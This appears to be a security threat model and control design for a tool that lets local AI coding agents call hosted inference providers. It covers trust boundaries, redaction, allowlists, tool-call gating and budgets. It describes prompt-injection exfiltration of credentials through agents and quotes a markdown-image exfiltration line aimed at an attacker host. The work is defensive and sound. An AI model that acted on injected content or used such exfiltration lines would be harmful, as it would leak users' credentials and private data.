## 1. Scope, dedup-set and estate locks

### 1.1 What this lens covers

The generic inference tool the owner intends to build (the replacement for `glm53-space`) will let local agents (Claude Code, Codex, Cursor, goose, Fabric, aider, opencode) send prompts to third-party inference: Hugging Face Inference Providers and Spaces, OpenRouter (sidecar only), rented GPUs (Modal/RunPod/Lightning), Azure AI Foundry, local llama.cpp/Ollama/LM Studio, and the Cursor quota bridge `auth2api`. This lens asks: what can go wrong when an agent that holds local shell, files and credentials talks to a model it does not control, and what is the smallest set of controls the registry (`.agents/agents.json`) and the tool must enforce.

### 1.3 Estate locks (hard; cited as constraints)

- `[ESTATE-LOCK]` OpenRouter is a spend-capped CLI/Codex sidecar only - never a Cursor BYOK key, never Claude `ANTHROPIC_BASE_URL`, never a new OpenRouter MCP.

- `[ESTATE-LOCK]` `auth2api :8317` stays the only Cursor bridge and retires within 7 days of an official Cursor `/v1` GA. Ports 8765/8812/8317 are owned.
- `[ESTATE-LOCK]` `.agents/skills` is the one prompt SSOT (Fabric/Goose consume it). Consequence: any "system prompt hardening" text proposed below is a skill/prompt-pack edit, not a new file elsewhere.
- `[ESTATE-LOCK]` Never rotate credentials. Consequence: the classic incident response to a leaked token (rotate) is off the table by rule, which **raises** the value of prevention (scoped tokens, redaction, ledger) and of provider-side revocation-free controls (per-key spend caps, allowlists). - `[ESTATE-LOCK]` Never remove a feature to buy reliability; present tradeoffs instead.

## 2. Assets and trust boundaries

### 2.1 Assets the generic inference tool can expose or damage

| # | Asset | Where it lives | How a hosted-model call can touch it |
|---|---|---|---|
| A1 | Provider credentials (`HUGGINGFACE_TOKEN`, OpenRouter key, Azure key, Modal/RunPod tokens) | `.agents/local.json`, process env, `~/.local/bin` wrappers | Sent as bearer to the correct host (intended); leaked if the model or a Space redirects the base URL, or if the agent pastes env into a prompt. |
| A2 | 17 other registry credentials (`GH_TOKEN`, `GITHUB_MCP_PAT`, `DIGITALOCEAN_API_TOKEN`, `LINKEDIN_*`, `SENTRY_*`, ...) `[FACT A, 2026-09-02]` | same | Exfiltrated if an injected instruction makes the agent read env/`local.json` and include it in the next prompt. |
| A3 | Private transcripts, repo contents, `basic-memory` notes (:8765), `agent-mail` messages (:8812) | local services + files | Sent to a third party as "context" by a helpful agent; the estate rule forbids raw private transcripts. |
| A4 | Local execution (shell, files, browser-bridge :8770, HexStrike, Cheat Engine bridge) | the harness | Driven by `tool_calls` proposed by a remote model - the "hosted model proposes; harness executes" boundary. |
| A5 | Money / quota | HF PAYG credits, OpenRouter credits, Azure subscription, Cursor plan quota via auth2api | Unbounded consumption (OWASP LLM10) by a runaway loop or a model that emits enormous outputs. |
| A6 | Reputation / ToS standing | Cursor account, HF account | A bridge that violates a vendor's terms, or a Space that violates HF content rules, can cost an account. |
| A7 | Integrity of the SSOT | `.agents/skills`, `agents.json` | A model-suggested edit to a skill file is a supply-chain write into every consumer (Fabric, Goose). |

### 2.2 Trust boundaries (numbered; referenced by the threat table)

```
[Local agent process]--TB1-->[generic inference tool]--TB2-->[HF router / OpenRouter / Space / Endpoint / Azure / auth2api]--TB3-->[actual GPU provider or Space owner]
        ^                                                             |
        |<---------------------- TB4 (model output / tool_calls) -----+
[Local runtimes: Ollama, LM Studio, llama-server]--TB5 (loopback vs 0.0.0.0)-->[LAN / internet]
```

- TB1: the agent decides what context goes into the prompt. This is where redaction and the "never send secrets or raw private transcripts" rule must be enforced mechanically, because the model cannot enforce it.
- TB2: the tool decides which base URL and which model id it will call. This is where the allowlist lives.
- TB3: the router decides which downstream provider serves the request. HF says it does not store bodies but defers to each provider's policy `[FACT A, 2026-09-02]` (section 4); OpenRouter exposes per-provider policy as data and lets you filter on it `[FACT A, 2026-09-02]` (section 4). A Space is different: the Space owner is the provider, and there is no policy at all unless they publish one.
- TB4: everything that comes back is untrusted input. Tool-call arguments are attacker-influenced strings until validated against the tool's JSON schema and the local allowlist.
- TB5: local runtimes are only "private" if they listen on loopback.

`[INFERENCE]` The dedup skill's hard rule 3 covers TB4. Nothing in the dedup-set covers TB1 (redaction), TB2 (base-URL/model allowlist) or TB3 (provider policy filter) mechanically; they are covered only by prose ("Never send secrets or raw private transcripts").

### 3.6 Cross-cutting: the "lethal trifecta"

Simon Willison's framing (2025-06-16): an agent that combines (1) access to private data, (2) exposure to untrusted content and (3) the ability to communicate externally can be made to steal the data by content it merely reads; he explicitly lists "make an HTTP request - to an API" as a sufficient exfiltration channel `[FACT B, corroborated by Beurer-Kellner et al. arXiv:2506.08837, 2025-06-16]` https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/. 

`[INFERENCE]` Every path above is ingredient (3) by construction: **the next inference call is itself the outbound channel** - no browser or webhook needed. The agent holds (1) (A1-A3) and consumes (2) (the model's reply, any web page it summarised, any Space output). The minimal control set in section 8 therefore concentrates on breaking (1) at TB1 (redaction + never-send list) and gating (2)->(4) at TB4 (schema + allowlist + human approval for high-impact tools), rather than on detecting injection text - which even OpenRouter ships only as regex matching `[FACT A, 2026-09-02]` https://openrouter.ai/docs/guides/features/guardrails. The pattern-catalogue restatement ("tools missing capability tags must be treated as carrying all three"; "the check is performed by the host, not by guardrail prompts") is the design rule I adopt for the registry in 8.1 `[FACT C, 2025-2026]` https://www.agentpatternscatalog.org/patterns/lethal-trifecta-threat-model/.

## 8. Minimal control set the registry and tool must enforce

Design constraints carried over: `[ESTATE-LOCK]` no gateway product (LiteLLM etc.), so enforcement lives in (a) `.agents/agents.json` schema + a check script, (b) the one generic tool's process, (c) provider-native features. Fail-closed for confidentiality controls (C1, C2), fail-open for availability-shaped ones (C3 tripwire) - matching the repo's own split between `redaction.py` ("Default ON, opt-out explicit") and `injection_grammar.py` ("fail-open by contract") `[FACT A, in-repo docstrings]`.

### C1 - Allowlists (registry-enforced, fail-closed)

- **Base-URL allowlist.** Each inference profile declares exactly one `baseUrl` host. The tool refuses any request whose resolved host is not the profile's host, and refuses HTTP redirects across hosts (`allow_redirects=False` / follow only same-origin). This alone kills T-10 (bearer sent to a Space) and the base-URL-swap class of leaks.
- **Credential-to-host binding.** `credentialNames[i]` is bound to an `issuer` host pattern (`hf_*` -> `*.huggingface.co`, `sk-or-v1-*` -> `openrouter.ai`). A profile that would send `HUGGINGFACE_TOKEN` to `*.hf.space` fails validation. `[INFERENCE]` from T-10.
- **Provider allowlist per profile.** HF: pin `model:<provider>` and reject the bare model id (which silently means `:fastest`) for profiles tagged `sensitive`; use `:preferred` plus an ordered provider list in HF settings for the rest; OpenRouter: set `provider.only` + `allow_fallbacks:false` + `data_collection:"deny"` in the request body **and** assign a Guardrail with the same provider allowlist to the sidecar key (belt and braces; Guardrails intersect, stricter wins `[FACT A]`).
- **Model allowlist per profile** (registry) mirrored to the OpenRouter Guardrail model allowlist where the profile is OpenRouter.
- **Space allowlist = empty by default.** A `*.hf.space` or Gradio base URL is permitted only for a profile explicitly tagged `stranger-space`, which forces `sensitivity: public-only` (C2 strict mode) and disables `tool_calls` execution (C4). `[RECOMMENDATION]` - this is the one place where the estate's "never remove a feature" lock bites: keep the feature, but make the tag mandatory and loud.
- **Local runtime allowlist.** Profiles for Ollama/LM Studio/llama-server must declare `127.0.0.1`/`localhost`; the check script probes `netstat`/`Get-NetTCPConnection` for `0.0.0.0:11434`/`:1234`/`:8080` binds and fails the health check if found (T-14).

### C2 - Redaction at TB1 (tool-enforced, default ON, opt-out per profile)

- Reuse `tools/mcp/proxy-mcp/redaction.py`'s "name-and-length, never value" scrubber `[FACT A, in-repo]` and its rule source; extend the pattern list with OpenRouter's published Secrets preset formats (`hf_`, `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`, `github_pat_`, `sk-or-v1-`, `sk-ant-api03-`, `sk-proj-`+`T3BlbkFJ`, `dop_v1_`, `AKIA`, PEM blocks, JWTs, `xox*`) `[FACT A, 2026-09-02]` https://openrouter.ai/docs/guides/features/guardrails/secret-formats.md - every one of the estate's 18 `credentialNames` issuers that has a recognisable prefix is covered by that list.
- Add an **exact-value** check: load the values of all 18 registry credentials from env/`local.json` at tool start and refuse to send any message containing one of them verbatim (or base64 of it). Prefix regexes miss unprefixed tokens (Codacy/Sonar/Tavily); exact-value matching does not. Never log the value; log `name+length`.
- **Raw-transcript guard.** Refuse messages that contain more than N (say 20) lines matching the estate's transcript markers (Claude Code / Codex JSONL shapes, `agent-mail` message envelopes, `basic-memory` note frontmatter) unless the profile is tagged `transcript-ok`. This is the mechanical form of "never send raw private transcripts". `[RECOMMENDATION]`
- Where the profile is OpenRouter, additionally assign the **Secrets** and **Sensitive Info** Guardrail presets to the sidecar key (provider-side second line; `redact` action) `[FACT A]`.

### C3 - Output is an untrusted tool result (fail-open tripwire)

- Route every completion through the existing D2 tripwire (`agent-self/harness/injection_grammar.py`, full grammar: directive + payload) before it is shown to the agent `[FACT A, in-repo]`; on a hit, wrap the output in an explicit `[UNTRUSTED MODEL OUTPUT - injection grammar hit: <reason_code>]` envelope rather than dropping it (feature preserved; signal added).
- Never auto-render markdown images / links from model output in any surface that fetches them (classic `![](https://attacker/?d=...)` exfil) `[FACT B]` https://aiarch.dev/prompt-injection.

### C4 - Tool-call gate at TB4 (harness-enforced)

- `tool_calls` from a hosted model are validated against the **local** JSON schema and the profile's tool allowlist (the dedup skill's rule 3), then classified with three capability tags (`private-read`, `untrusted-ingest`, `outbound`). If the turn already contains `untrusted-ingest` and the call is `outbound` while `private-read` occurred, require confirm. Reuse `tools/mcp/_shared/hardening.py` `ConfirmGate` `[FACT A, in-repo]` - but note it ships **SHADOW by default**; for hosted-model-originated calls run it in `enforce`.
- Registry: replace `toolAllowlist: ["*"]` for inference profiles with an explicit list; keep `["*"]` for the 42 MCP servers if the owner prefers (tradeoff, not removal).

### C5 - SSOT write gate

- Any write under `.agents/skills/**`, `.agents/agents.json`, `.agents/local.json` originating from a hosted-model tool_call requires a shown diff + confirm; `local.json` is never readable by the tool at all (it only receives resolved credential **names**). `[RECOMMENDATION]` (LLM05/LLM03 on A7).

### C6 - Pin what you trust

- Hash `name+description+inputSchema` of every advertised tool at approval, store in the registry entry (`toolDigest`), compare on every `tools/list`, quarantine on drift (rug-pull defence; the only control that catches it `[FACT B, corroborated]`). Pin `npx` packages to exact versions instead of `@latest` for the 6 entries (`[FACT A]`; tradeoff: manual bumps).
- Weights: refuse non-safetensors/GGUF loads by default (T-16).

### C7 - Kill switch + budgets

- **Budget:** per-profile `maxTokensPerCall`, `maxCallsPerSession`, `maxUsdPerDay` (HF has no free-plan billing control `[FACT A]`, so the tool must count; OpenRouter has native per-key `limit` `[FACT A]` - set it and read `limit_remaining` at start).
- **Kill switch:** a single file flag (e.g. `.agents/INFERENCE-HALT`) + env `INFERENCE_HALT=1` checked before every outbound call, and honoured by the tool **in-process** (no dependency on a supervisor that the OOM path might kill first - T-15). The existing `mcp-host-supervisor` AND-gate `[FACT A, in-repo]` remains the process-level layer; this is the request-level layer.
- **Provider-side switch:** for OpenRouter, a Guardrail `limit_usd` of 0 assigned to the key is an instant, reversible, no-rotation kill `[FACT A]` - compatible with the never-rotate lock.

### C8 - Ledger

- One JSONL line per call in the existing event-ledger root (`events.jsonl` convention, `tools/workspace-hooks/event-ledger-extras` `[FACT A, in-repo]`): `ts, profile, baseUrl host, requested model, resolved provider (OpenRouter: `openrouter_metadata` with the opt-in Router Metadata header `[FACT A]`; HF: record the pinned `:provider` suffix - I did not find a documented response field naming the provider HF actually used `[UNVERIFIED]`, which is one more reason C1 pins it), prompt sha256 (not text), redaction hits (name+length), injection-grammar hits, usage tokens, cost estimate, finish_reason, tool_calls count, confirm decisions`. This answers "where did this prompt go, what did it cost, did anything trip" without storing prompts - which would itself violate LLM02.

### 8.6 Tradeoffs the owner must decide (per the locks, presented, not decided)

1. **Never-rotate vs the repo's own escalation.** `.gitleaks.toml` Allowlist 1 records that `tools/mcp/workstation-codex-bundle/env/private-env.windows.json` carries real plaintext tokens intentionally committed to this private repo and "SHOULD be rotated/revoked and migrated" `[FACT A, in-repo]`. The lock says never rotate. The consistent resolution is **add-scoped-tokens-without-revoking** (S-01) plus C1/C2 so the old tokens are never sent anywhere new; the residual risk (history exposure) stays and is owned.
2. **auth2api ToS exposure (T-18)** vs the lock to keep it until Cursor `/v1` GA: keep it, log every call in C8 so the retirement is measurable, and read Cursor's current Terms (not fetched here).
3. **Stranger Spaces**: keep the capability (lock) behind a mandatory `stranger-space` tag that forces public-only content and no tool execution.
4. **`npx @latest` convenience vs C6 pinning**: pinning costs manual bumps; the alternative is accepting that 6 servers run whatever ships next.

## 10. Ten-line summary

1. The dedup skill already states the right doctrine ("hosted model proposes; harness executes") but nothing in the estate enforces the three other boundaries mechanically: what leaves (TB1), where it goes (TB2/TB3), and what comes back (TB4).
2. Biggest concrete gap: one `HUGGINGFACE_TOKEN` name serves both the write-capable Hub MCP and the inference adapter; HF fine-grained "Make calls to Inference Providers" tokens fix it without rotating anything (S-01, NATIVE).
3. HF's router stores nothing but explicitly defers to each provider's policy; provider selection defaults to `:fastest`, and data policy is not a selection criterion HF offers - so pin `:provider` per profile (S-02/S-05).
4. OpenRouter is the surprise: Guardrails give provider/model allowlists, ZDR, secret-format redaction and a `limit_usd` that doubles as a no-rotation kill switch, all NATIVE and compatible with the sidecar-only lock (S-04); its live provider feed (83 rows, 4 "may train") is the best machine-readable policy source I found (S-05).
5. Stranger-run Spaces are the highest-severity path: the owner sees everything, and a 2026-06 arXiv study over 972k apps shows public-Space runtime logs are world-readable to any HF user, with 936 credential-leaking apps and 27 backdoors - keep the feature behind a mandatory `stranger-space` tag that forces public-only content and no tool execution (S-06).
6. Local runtimes are safe only on loopback: 175k exposed Ollama hosts (SentinelLABS/Censys, 2026-01) and CVE-2026-7482 leaking API keys from memory make a bind check worth one PowerShell line (S-11).
7. OWASP 2025 mapping: LLM02 and LLM06 are the impact items for a client-side tool (the agent is the discloser; the harness holds shell and 18 credentials); LLM01 is only the mechanism - break the lethal trifecta rather than detect injection text.
8. Minimal control set: C1 allowlists (base URL, credential-issuer binding, provider, model, Space, local bind), C2 redaction default-ON (reuse `proxy-mcp/redaction.py` + exact-value match), C3 output-as-untrusted (reuse `injection_grammar.py`), C4 tool-call gate (reuse `ConfirmGate` in enforce), C5 SSOT write gate, C6 digest pinning, C7 in-process kill switch + budgets, C8 hash-only JSONL ledger.
9. Governance finding: the registry executes `tools/mcp/glm53-space` from a path that `origin/main` does not carry - a one-line preflight assertion closes that class (S-08); GLM-5.3's license is `other/glm-5.3` (MIT-like), models.dev is MIT but is pricing data, not policy data (S-13).
10. Locks honoured throughout: no gateway product, OpenRouter stays a capped sidecar, auth2api stays (its ToS exposure and the repo's own "should rotate" escalation are presented as tradeoffs in 8.6, not resolved here).
